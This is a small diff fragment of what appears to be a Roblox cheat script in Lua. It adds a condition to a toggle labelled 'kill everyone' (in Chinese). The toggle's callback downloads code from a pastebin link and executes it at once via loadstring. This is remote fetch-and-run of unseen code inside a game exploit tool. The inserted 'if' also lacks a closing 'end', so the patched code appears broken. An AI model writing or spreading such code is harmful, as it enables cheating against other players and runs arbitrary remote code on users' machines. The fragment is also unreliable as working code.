@@ -577,6 +577,7 @@ Tab:AddToggle({
 	Name = "杀所有人",
 	Default = false,
 	Callback = function(Value)
+         if Value then
 		loadstring(game:HttpGet("https://pastebin.com/raw/kXjfpFPh"))()
 	end
 })
